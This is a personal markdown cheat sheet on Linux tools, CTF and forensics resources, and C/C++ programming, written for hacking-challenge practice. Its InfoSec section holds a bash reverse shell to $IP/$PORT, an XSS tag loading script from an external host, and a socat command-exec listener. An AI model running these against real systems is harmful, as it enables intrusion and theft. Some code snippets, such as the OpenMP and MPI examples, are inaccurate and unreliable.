---
title: The One Note
subtitle: Notes on computer
author: João Fukuda
---

* [Linux](#linux)
* [InfoSec](#infosec)
* [Programming](#programming)

# Linux

Programs list:

* sort
* uniq
* tr
* rev
* echo
* bc
* gnuplot
* xargs
* convert

## entr

Checks for changes in files passed through stdin

Run a command when a file changes:
```bash
ls src/* | entr <cmd> # No quotes needed
```

## awk

Work with tables and column outputs in Linux.

* from [here](https://www.youtube.com/watch?v=sz_dsktIjt4)

Print only second column
```bash
awk '{print $2}'
```

Match and Regex
```bash
# First column equals '1' and second matches regex
awk '$1 == 1 && $2 ~ /^c.*e$/ {print $0}'
```

Count number of lines
```bash
# First column equals '1' and second matches regex
awk 'BEGIN { rows = 0 }$1 == 1 && $2 ~ /^c.*e$/ { rows += 1 } END {print rows}'
```

## openssl

Sym key encrypt/decrypt file
```bash
# Encrypt
openssl aes-256-cbc -salt -in file -out encfile

# Decrypt
openssl aes-256-cbc -d -in encfile -out file
```

Netcat through SSL
```bash
openssl s_client -connect address:port -nbio
```

## sed

Substitute editor

`-E`{bash} for Perl's regex syntax.

Replace first
```sed
s/find/replace/
```

Replace all
```sed
s/find/replace/g
```

Delete line
```sed
/find/d
```

Show first `10` lines
```sed
10q
```

Edits document in-place
```bash
sed -i 's/<pattern>/<subst>/'
```

Use the matching group
```bash
sed -E 's/(patt1) (patt2)/\2/' # replaces \2 with `patt2`'s match
```

Use non greedy match instead of getting the biggest possible match
```bash
# ? after * or +
sed -E 's/.*?\s//'
```

Ignore group matching for matches inside `()`
```bash
# (?:<pattern>)
sed -E 's/(?:.*)//'
```

## paste

Format lines of output

Get lines from stdin and print delimited by comma
```bash
paste -sd,
```

## ffmpeg

Formats and converts raw video and image data

Get photo from webcam to `feh`
```bash
ffmpeg -i /dev/video0 -frames 1 -f image2 - | feh -
```

Get video from webcam to `vlc`
```bash
ffmpeg -i /dev/video0 -f mpegts - | vlc -
```

## make

Don't echo command
```make
all:
	@echo Something
```

Makes with dependencies. Runs only **if** the dependency change
```make
target.pdf: target.md dep1.png
	pandoc -o target.pdf target.md

dep1.png: dep1.plt
	gnuplot dep1.plt
```

Pattern matching. Swaps `$*` for whatever was matched by the wildcard `%` and `$@` by the target
```make
target.pdf: target.md plot-dep.png
	pandoc -o target.pdf target.md

plot-%.png: %.plt
	gnuplot $*.plt -o $@
```

## Tmux

### Simple named session

```bash
tmux -s session_name
```

### Shared session

```bash
tmux new -s alice
```

And

```bash
tmux a -t alice
```

### Independent window sharing

```bash
tmux new -s alice
```

And

```bash
tmux new -s bob -t alice
```


# InfoSec

## Links

### Infos

* [CTFTime](https://ctftime.org/)
* [CTF101](https://ctf101.org/)

### Challenges

* [Crackmes.one](https://crackmes.one/)
* [CryptoHack](https://cryptohack.org/)
* [Cryptopals](https://cryptopals.com/)
* [VulnHub](https://www.vulnhub.com/)
* [Exploit Education](https://exploit.education/)
* [HackTheBox](https://www.hackthebox.eu/)
* [HackThisSite](https://www.hackthissite.org/)
* [Lord of SQL Injection](https://los.rubiya.kr/)
* [Metasploitable](https://docs.rapid7.com/metasploit/metasploitable-2/)
* [Microcorruption](https://microcorruption.com/login)
* [OverTheWire - Bandit](https://overthewire.org/wargames/bandit)
* [OverTheWire - Natas](https://overthewire.org/wargames/natas)
* [PicoCTF](https://www.picoctf.org/)
* Pwnable.{xyz,kr,tw}
* [RingZer0](https://ringzer0ctf.com/)
* [ROP Emporium](https://ropemporium.com/)
* [SANS Holiday Hack Challenges](https://holidayhackchallenge.com/)
* [SmashTheStack](http://smashthestack.org/)
* [TryHackMe](http://tryhackme.com/)

## General

### Hash Cracking

* [crackstation](https://crackstation.net/)
* john
* hashcat
* hashid
* haiti

## Web

* sublist3r

### Links

* [requestcatcher.com](https://requestcatcher.com/)
* [requestbin.net](https://requestbin.net/)

### curl

Get verbose request
```bash
curl -v url
```

Make post request
```bash
curl -X POST url
# or
curl -d data url
```
> Hint:
>
> -d could be `cat file`

### wget

Crawler
```bash
wget --spider -r -nv --level {0,N} -e robots=off url
```

### XSS

14.rs
```html
<script src="//14.rs"></script>
```

## Binary Exploit

* Ghidra

### Radare2

Enter with analysis on
```bash
r2 -AA <file>
```

### Visual mode

#### Enter Panel Mode
```
> v<CR>
```

#### On Panel Mode
* `<space>`
: Enter Graph Mode
* `<enter>`
: Zoom current panel
* `_`
: List/Goto symbols
* `\`
: Possible commands (One useful option is in 'edit > asm.pseudo')
* `!`
: Simple assembly visualization
* `b`
: Browse stuff
* `w`
: Window Mode

#### On Window Mode
* `X`
: Close window

#### On Graph Mode
* `q`
: Exit Graph Mode
* `<space>`
: Exit Graph Mode
* `_`
: List/Goto symbols
* `-`
: Zoom Out
* `+`
: Zoom In
* `0`
: Default Zoom

## Forensics

### Steganography

* exiftool
* steghide - jpeg
* zsteg - png, bmp
* stegcracker
* stegoveritas - auto image filtering

### XXD

Read file in binary:
```bash
xxd file
```

Revert from hexdump to a file:
```bash
xxd -r -p dump output_file
```

### Binwalk

Extract:
```bash
binwalk -e file
```

Hard extract:
```bash
binwalk --dd='.*' -M file
```

### Volatility

Memory dump tool

Check dump profile
```bash
volatility -f file imageinfo
```

Get console log
```bash
volatility -f file --profile=<profile> consoles
```

Get processes list
```bash
volatility -f file --profile=<profile> {pstree,psscan}
```

Hash dump
```bash
volatility -f file --profile=<profile> hashdump
```

## Networking

* Nikto

### Socat

Run a command through a TCP connection:
```bash
socat tcp-listen:<port>,fork,reuseaddr 'exec:<cmd>'
```

### Rev Shell

```bash
bash -c 'bash -i >& /dev/tcp/$IP/$PORT 0>&1'
```

For better performance, use `pwncat` to listen

### Aircrack-ng suite

Crack wifi passwords from `.pcap` files
```bash
aircrack-ng file wordlist
```

### tshark

Filter outputs
```bash
tshark -r file -Y filter

# Useful filters:
#
# ip.{addr,src,dst}
# http[.method]
# tcp[.{port,src,dst}]
# frame.number
```

Get files (or use tcpflow)
```bash
# prot (transport protocol): tcp, udp, tls, http2, quic
# mode (output): ascii (ascii + '.' as non-print), ebcdic, hex (hexa + ascii), raw (hexa)
# filter (which flow to follow): index, ip + port pair
tshark -r file -z follow,prot,mode,filter[,range]

# Example:
tshark -r file -z "follow,tcp,ascii,200.57.7.197:32891,200.57.7.198:2906"
```

### nslookup (network service/server)

Normal/reverse lookup
```
> server <DNS server>
> 1.1.1.1
> joaofukuda.dev
```

Change register type
```bash
nslookup --type=MX 1.1.1.1
```

### NMap

Run nmap with proxychains (needs `sudo` and `-sT` (maybe `-n` for no DNS resolution))
```bash
sudo proxychains nmap -sT [-n] [<options> ...] <target>
```

# Programming

## Versioning

#### Lock files

Locks dependency versions

#### Vendering

Put the dependencies **inside** your project and ship program with it

### Semantic version number

```
8.1.7
^ ^ ^
| | +-> patch
| +---> minor
+-----> major
```

#### Increment

* Patch:
: **Entirely** backwards compatible version (ex.: security patches)
* Minor:
: New functions
* Major:
: Backwards **incompatible** change

## Testing

#### Unit test

Small tests for unique functions

#### Integration test

Test integration of multiple subsystem

#### Regression test

Test something that was broken before to prevent its reintroduction

#### Mocking

Replace parts of code to simulate a simpler environment

## Catch2

C++ unit testing library

Compile and run like this (with cmake):

CMakeLists.txt
```cmake
# ...
find_package(Catch2 REQUIRED)
add_executable(test test/main.cpp)
target_link_libraries(test Catch2Main Catch2)
```

test/main.cpp
```cpp
#include <catch2/catch_all.hpp>
// ...
```

### REQUIRE & CHECK

When REQUIRE fails, the tests abort
```cpp
REQUIRE( f() == 42 );
```

When CHECK fails, the tests continue
```cpp
CHECK( f() == 42 );
```

### REQUIRE_THAT & CHECK_THAT

Adds a second argument, a matcher.

Tests if the test matches the matcher
```cpp
REQUIRE_THAT( f(), Equals(42) )
REQUIRE_THAT( get_string(), Contains("banana") )
REQUIRE_THAT( get_string(), StartsWith("ba") )
REQUIRE_THAT( get_string(), EndsWith("ana") )
REQUIRE_THAT( get_vector(), VectorContains(9) )
REQUIRE_THAT( get_vector(), ( VectorContains(2) || VectorStartsWith(4) ) && Contains(3) )
```

Define custom matchers for your classes:
```cpp
class CustomMatcher : public Catch::MatcherBase<ClassToMatch>
{
	private:
		int m_expected;

	public:
		explicit CustomMatcher(int to_match) :
			m_expected(to_match)
		{}
		bool match(const ClassToMatch& other) const override
		{
			return m_expected == other.value;
		}

		std::string describe() const override
		{
			return "Custom class is equals to other";
		}
};

TEST_CASE()
{
	REQUIRE_THAT(ClassToMatch(), CustomMatcher(3));
}
```

Sections inside test cases:
```cpp
TEST_CASE()
{
	SECTION()
	{
		REQUIRE();
		// ...
	}
}
```

Generate test cases:
```cpp
TEST_CASE()
{
	int x = GENERATE(range(1, 11));
	int y = GENERATE(range(101, 111));

	REQUIRE(x < y);
}

TEST_CASE()
{
	auto s = GENERATE(as<std::string>(), "a", "b", "c"); // as keeps s from being a char*

	REQUIRE_THAT(banana(), Contains(s));
}

TEST_CASE()
{
	auto [input, expected_output] = GENERATE( values<std::pair<int, std::string>>({
		{3, "three"},
		{6, "six"},
		{1, "one"},
		{9, "nine"}
	}));

	REQUIRE(to_string(input) == expected_output);
}

TEST_CASE()
{
	auto [input, expected_output] = GENERATE( table<int, std::string>({
		{3, "three"},
		{6, "six"},
		{1, "one"},
		{9, "nine"}
	}));

	REQUIRE(to_string(input) == expected_output);
}

TEST_CASE()
{
	auto [start, eat, left] = GENERATE( table<int, int, int>({
		{3, 2, 1},
		{12, 0, 12},
		{6, 6, 0},
		{1, -1, 2},
		{9, 10, -1}
	}));

	GIVEN("There are " << start << " bananas")
	WHEN("I eat " << eat << " bananas")
	THEN("I should have " << left << " bananas") {
		REQUIRE(eat_bananas(start, end) == left);
	}
}
```

## git

* folder
: is a tree
* file
: is a blob

```
[S1]---[S2]---[S3]---[S5]
          \          /
           ---[S4]---
```

`[S5]` is a merge of both `[S3]` and `[S4]`

All States have metadata such as author and message

Beautiful `git log`
```bash
git log --all --graph --decorate --oneline
```

Check what **any** hash means
```bash
git cat-file -p <hash>
```

## Makefile

Make defaults to the first rule
```make
default:
#do stuff here
```

`.PHONY` identifies non-file rules
```make
.PHONY: all

all: output

output: code
   compile code to output
```

`%` is used to match parts of the rule's names and dependencies
```make
%.pdf: %.tex
   latexmk $<

tmp/%.o: src/%.cpp
   gcc $< -o $@
```

### Useful variables

* `$<`
: First dependency
* `$^`
: All dependencies
* `$@`
: Target name
* `$*`
: Result of pattern matching

More [here](https://www.gnu.org/software/make/manual/html_node/Automatic-Variables.html#Automatic-Variables)

## CMake

#### Useful Environmental Variables

`CC` defines C and `CXX` defines C++ compiler

`CFLAGS` define compiler flags

#### Useful Commands

Autogen the `compile_commands.json` used by the LSP
```cmake
set(CMAKE_EXPORT_COMPILE_COMMANDS ON)
```

#### Directories

Need to have a `CMakeLists.txt` file.

They can be added with the CMake command `add_subdirectory()`.

#### Check platform on C/C++

```c
if (WIN32)
   #do something
endif (WIN32)

if (UNIX)
   #do something
endif (UNIX)

if (MSVC)
   #do something
endif (MSVC)
```

More [here](https://gitlab.kitware.com/cmake/community/-/wikis/doc/tutorials/How-To-Write-Platform-Checks#platform-variables)

#### Scripts

```bash
cmake -p <script>.cmake
```

#### Modules

`<script>.cmake` on `CMAKE_MODULE_PATH`

Can be loaded with `include()`

### Syntax

#### Command

```cmake
command_name(space separated list of arguments)
```

It can:

* set variables
* change behavior of other commands

### Variables

Expand to an empty string when not set

```cmake
set(hello world)
message(STATUS "Hello, ${hello}")
```

#### Useful variables

* `CMAKE_CURRENT_SOURCE_DIR`

### Comments

```cmake
# Single line

#[==[
	Multi line comment
	#[=[
		These can be nested
	#]=]
#]==]
```

Inserting an additional `#` to the beginning of a multi-line comment disables that nest

### Custom commands

Added with `function()` or `macro()`

Old definitions of commands can be accessed with a `_` prefix

#### Example

```cmake
function(custom_cmd this that)
	# ...
	set(${this} ... PARENT_SCOPE) # global variable instead of local IF exists
endfunction()
custom_cmd(bana na)
```

There are these variables in custom_cmd scope: `this`, `that`, `ARGC`, `ARGV`, `ARGN`, `ARG0` and `ARG1`.

### Targets

#### Constructors

* `add_executable()`
* `add_library()`

#### Member variables

Target properties

#### Member functions

* `get_target_property()`
* `set_target_property()`
* `get_property(TARGET)`
* `set_property(TARGET)`
* `target_compile_definitions()`
* `target_compile_features()`
* `target_compile_options()`
* `target_include_directories()`
* `target_link_libraries()`
* `target_sources()`

Choose these instead of the ones above:

* `add_compile_options()`
* `include_directories()`
* `link_directories()`
* `link_libraries()`

```cmake
target_compile_features(Foo
	PUBLIC
		cxx_string_enums
	PRIVATE
		cxx_lambdas
		cxx_range_for
)
```

## Debugging

### GDB

#### Running
* `file`
: load file symbols
* `r`
: start new debug session
* `stepi`
: start and stop at the first instruction of the program
* `s`
: step (also step inside function calls)
* `n`
: step (skip function calls)
* `c`
: continue running until end of program or breakpoint

#### Breakpoints
* `break <lineNum>|*<instructionAddr>[+<offsetNum>] [thread <threadno>] [if <condition>]`
: set breakpoint
* `info break`
: list breakpoints
* `condition <breaknum> [<expression>]`
: adds (or removes if expression is not passed) a condition to breakpoint `<breaknum>`
* `delete [breakpointID]`
: delete breakpoint (if no breakpoint, delete all breakpoints)
* `commands <breakpointID> [<command>]`
: register command `<command>` (or commands passed as stdin) to run when breakpoint is hit

#### Var
* `p (<expression>|*<arr>@<len>)`
: prints the expression or array `<arr>` of length `<len>`
* `whatis <var>`
: check type of `<var>`
* `i local`
: list local variables
* `i args`
: list current function args
* `watch <expression> [if <condition>]`
: watch expression and everytime the expression changes, the execution stops
* `rwatch <expression> [if <condition>]`
: everytime the expression is read, the execution stops
* `set args <arg>...`
: set args of current frame to `<arg>...`
* `set var <var> <value>`
: set `<var>` to `<value>`

#### Recording
* `record`
: records the execution and allows for reverse commands
* `reverse-continue`
: same as normal, but in reverse
* `reverse-stepi`
: same as normal, but in reverse
* `reverse-step`
: same as normal, but in reverse
* `reverse-nexti`
: same as normal, but in reverse
* `reverse-next`
: same as normal, but in reverse

#### Misc
* `dprintf <symbol>,<format>,[<arg>...]`
: put printf without having to recompile the code
* `frame <N>`
: put you on the `<N>` frame (or scope) (useful on backtracing)
* `disas [<symbol>]`
: disassembles <symbol> (or current frame)
* `x/[<N>](x|s|i) *<address>`
: show `<N>` objects (x: hex, s: strings, i: instructions) stored on address `<address>`
* `refresh/ctrl-l`
: redraws the screen
* `ctrl-x-a`
: toggle from/to tui mode
* `ctrl-x-2`
: visual window modes
* `set print pretty on`
: help print structures
* `set disassembly- intel`
: set better asm style

### Valgrind

Start valgrind
```bash
valgrind program
```

Start with gdb server stopping at the first instruction
```bash
valgrind --vgdb=full --vgdb-error=0 program
```

## Clang & GCC

`clang`, `clang++`, `gcc` and `g++` both have the same set of flags

Normal compilation
```bash
${CC} <src>
```

With gdb debugging flags
```bash
${CC} -ggdb3 -Og <src>
```

Check for invalid memory access
```bash
${CC} -fsanitize=address <src>
```

Optimization
```bash
${CC} -O0 <src> # no optimization
${CC} -O1 <src> # Simplest optimization (fast)
${CC} -O2 <src> # Normal optimization (normal)
${CC} -O3 <src> # Best optimization (slow)
${CC} -Ofast <src> # Weird optimization
```

Treat warnings as errors:
```bash
${CC} -Werror <src>
```

### Clang niceties

Dump `struct`'s memory layout
```bash
clang -cc1 -emit-{obj,llvm} -fdump-record-layouts{,-simple}
```

`-cc1` is clang's front-end (the internal options)

## Modern C/C++ Networking (Linux)

### Structures

```cpp
struct addrinfo {
	int ai_flags; // AI_PASSIVE, AI_CANONNAME, etc.
	int ai_family; // AF_INET, AF_INET6, AF_UNSPEC
	int ai_socktype; // SOCK_STREAM, SOCK_DGRAM
	int ai_protocol; // use 0 for "any"
	size_t ai_addrlen; // size of ai_addr in bytes
	struct sockaddr *ai_addr; // struct sockaddr_in or _in6
	char *ai_canonname; // full canonical hostname

	struct addrinfo *ai_next; // linked list, next node
};
```

```cpp
struct sockaddr {
	unsigned short sa_family; // address family, AF_xxx (AF_INET, AF_INET6, ...)
	char sa_data[14]; // 14 bytes of protocol address
};
```

```cpp
struct sockaddr_in {
	short int sin_family; // Address family, AF_INET
	unsigned short int sin_port; // Port number
	struct in_addr sin_addr; // Internet address
	unsigned char sin_zero[8]; // Same size as struct sockaddr
};

// (IPv4 only--see struct in6_addr for IPv6)

// Internet address (a structure for historical reasons)
struct in_addr {
	uint32_t s_addr; // that's a 32-bit int (4 bytes)
};
```

```cpp
// (IPv6 only--see struct sockaddr_in and struct in_addr for IPv4)

struct sockaddr_in6 {
	u_int16_t sin6_family; // address family, AF_INET6
	u_int16_t sin6_port; // port number, Network Byte Order
	u_int32_t sin6_flowinfo; // IPv6 flow information
	struct in6_addr sin6_addr; // IPv6 address
	u_int32_t sin6_scope_id; // Scope ID
};

struct in6_addr {
	unsigned char s6_addr[16]; // IPv6 address
};
```

```cpp
struct sockaddr_storage {
	sa_family_t ss_family; // address family

	// all this is padding, implementation specific, ignore it:
	char __ss_pad1[_SS_PAD1SIZE];
	int64_t __ss_align;
	char __ss_pad2[_SS_PAD2SIZE];
};
```

### Converting and using functions

```cpp
struct sockaddr_in sa; // IPv4
struct sockaddr_in6 sa6; // IPv6

inet_pton(AF_INET, "10.12.110.57", &(sa.sin_addr)); // IPv4
inet_pton(AF_INET6, "2001:db8:63b3:1::3490", &(sa6.sin6_addr)); // IPv6
```

```cpp
// IPv4:

char ip4[INET_ADDRSTRLEN]; // space to hold the IPv4 string
struct sockaddr_in sa; // pretend this is loaded with something

inet_ntop(AF_INET, &(sa.sin_addr), ip4, INET_ADDRSTRLEN);

printf("The IPv4 address is: %s\n", ip4);


// IPv6:

char ip6[INET6_ADDRSTRLEN]; // space to hold the IPv6 string
struct sockaddr_in6 sa6; // pretend this is loaded with something

inet_ntop(AF_INET6, &(sa6.sin6_addr), ip6, INET6_ADDRSTRLEN);

printf("The address is: %s\n", ip6);
```

### Network system calls

```cpp
#include <sys/types.h>
#include <sys/socket.h>
#include <netdb.h>

int getaddrinfo(const char *node, // e.g. "www.example.com" or IP
	const char *service, // e.g. "http" or port number
	const struct addrinfo *hints,
	struct addrinfo **res);
```

```cpp
#include <sys/types.h>
#include <sys/socket.h>

int socket(int domain, int type, int protocol);
```

```cpp
#include <sys/types.h>
#include <sys/socket.h>

int bind(int sockfd, struct sockaddr *my_addr, int addrlen);
```

## C/C++ Multithreading

### PThreads

```cpp
pthread_create(thread_to_put, options, function, (void(*)(void*))argument);
```

Create a thread:
```c
pthread_t t;
pthread_create(&t, NULL, func, NULL);
pthread_exit(0);
```

Create from a thread attribute:
```c
pthread_t t;
pthread_attr_t a;
pthread_attr_init(&a);
pthread_attr_setdetachstate(&a, PTHREAD_CREATE_JOINABLE);

pthread_create(&t, a, func, NULL);

pthread_attr_destroy(&a);
```

### OpenMP

Simple program:
```c
#pragma omp parallel
{
	puts("Hello, world in threads!\n");
}
```

Make variables shared or private (copies) in a thread:
```c
int tid, i, nthreads;
#pragma omp parallel default(shared) private(i, tid)
{
	tid = omp_get_thread_num();
	printf("Thread #%d\n", tid);

	if (tid == 0) {
		nthreads = omp_get_num_threads();
		printf("# of threads: %d\n", nthreads);
	}
}
```

Define the number of threads:

* Runtime env:
: `OMP_NUM_THREADS=16 ./a.out`
* Code:
: `omp_set_num_threads(16);`
* Compile time define:
: `#define OMP_NUM_THREADS 16`
* Compile time define:
: `gcc -DOMP_NUM_THREADS=16 main.c -fopenmp`

For parallelization:
```c
#pragma omp parallel for
for (i = 0; i != 10; ++i) {
	// This is in parallel
}
```

Separate 4 iterations per thread:
```c
#pragma omp parallel for schedule(static, 4)
for (int i = 0; i != 10; ++i) {
	// This is in parallel
}
```

Possible iteration division types:

* `static`
: specifically chunk-sized iterations, in order
* `dynamic`
: request n every time there is space
* `guided`
: like dynamic, but size of chunk is proportional to # of unassigned iterations / # of the threads
	chunk-size is minimum chunk size
* `auto`
: yep, auto
* `runtime`
: you define at runtime what it'll be (with `omp_set_schedule` or env `OMP_SCHEDULE`)

Reduce the variable result to an operation:
```c
int result;

#pragma omp parallel for reduce(+:result)
for (int i = 0; i != 10; ++i) {
	result += i;
}
```

Reduce operations allowed: `+, -, *, &, |, ^, &&, ||`

Also allows:
* `++` and `--`
* `o=`

* [For & Schedule](http://jakascorner.com/blog/2016/06/omp-for-scheduling.html)
* [For & Reduce](http://jakascorner.com/blog/2016/06/omp-for-reduction.html)

### Cuda

* Thread
: One processing flow
* Block
: X by Y threads
* Grid
: M by N blocks

```cpp
#include <cuda.h>

// Kernel (gpu function)
__global__ void greet()
{
	// Do stuff
}

int main()
{
	// N threads
	greet<<<1, N>>>();
}
```

Kernel functions are called with `<<<X, Y>>>`

* `X`
: Num of blocks
* `Y`
: Threads per block

**Define block/grid dimension**

Pass a `dim3` instead of an `int`

```cpp
dim3 blockDim(32, 32); // 1024 threads
greet<<<1, blockDim>>>();
```

**Useful vars (inside kernel functions)**

* `gridDim`
* `blockIdx`
* `blockDim`
* `threadIdx`

**Passing arrays back and forth to the GPU**

Allocate memory on GPU

```cpp
int* array;
cudaMalloc(&array, 128);
```

Send data to the GPU

```cpp
cudaMemcpy(array, buf, 128, cudaMemcpyHostToDevice);
```

Receive data from the GPU

```cpp
cudaMemcpy(buf, array, 128, cudaMemcpyDeviceToHost);
```

Free memory allocated

```cpp
cudaFree(array);
```

**Printing inside CUDA Kernel Function**

```cpp
printf("Thread id: %d\n", (threadIdx.y * blockDim.x) + threadIdx.x);
```

Yes, `printf`

**Compiling and Running**

Compile:

```bash
nvcc [gcc flags] main.c -o app
```

And run:

```bash
./app
```

## C/C++ Distributed Systems

### OpenMPI

* Rank
: thread id
* Size
: max threads

```c
#include <mpi.h>

int main(int argc, char* argv[])
{
	int rank, size;

	MPI_Init(&argc, &argv);

	// Get rank
	MPI_Comm_rank(MPI_COMM_WORLD, &rank);
	// Get comm size
	MPI_Comm_size(MPI_COMM_WORLD, &size);

	// Stuff happens here

	MPI_Finalize();
}
```

**Compiling and Running**

Compile:

```bash
mpicc [gcc flags] main.c -o app
```

And run:

```bash
mpirun -c <num_of_processes> ./app
```

**Messaging**

Send and receive data through:

```c
void* buf; // Message to send
int count; // Number of data
MPI_Datatype type; // Type of data
int dest; // Destination rank (id)
int tag; // Message's tags
MPI_Comm comm; // Comm (normally MPI_COMM_WORLD)

MPI_Send(buf, count, type, dest, tag, comm);

// And

MPI_Status* status; // Status of recv

MPI_Recv(buf, count, type, src, tag, comm, status);
```

And broadcast (and receive) to all processes in a communication with:

```c
int root; // Rank (id) of the sending process
MPI_Request* req; // Request handle (don't ask, I don't know)

MPI_Bcast(buf, count, type, root, comm, req);
```

## Kernel Module Development

### Required stuff

Functions (`init` and `exit`), two options:

* Classic (old)

```c
int init_module(void)
{
	return 0;
}

void cleanup_module(void)
{
}
```

* Modern (use this)

```c
#include <linux/init.h>

int __init start_mod(void)
{
	return 0;
}

void __exit stop_mod(void)
{
}

module_init(start_mod);
module_exit(stop_mod);
```

Also define the license like this:

```c
MODULE_LICENSE("MIT"); // or GPL, Apache...
```

Author, description and supported devices can also be defined:

```c
MODULE_AUTHOR("Fukuda");
MODULE_DESCRIPTION("Bananas will be loaded");
MODULE_SUPPORTED_DEVICES("AMD64");
```

### The Makefile

```Makefile
.PHONY: all clean

obj-m += src/hello.o

all:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules

clean:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
```

### `__init`, `__initdata` and `__exit`

`__init` and `__initdata` are freed once the module is loaded into kernel

`__exit` is loaded only if the kernel is a module (and not built-in)

Usage example of a `__initdata` macro:

```c
static int hello3_data __initdata = 3;
```

### Useful functions

```c
printk(KERN_INFO "Banana!\n");
```
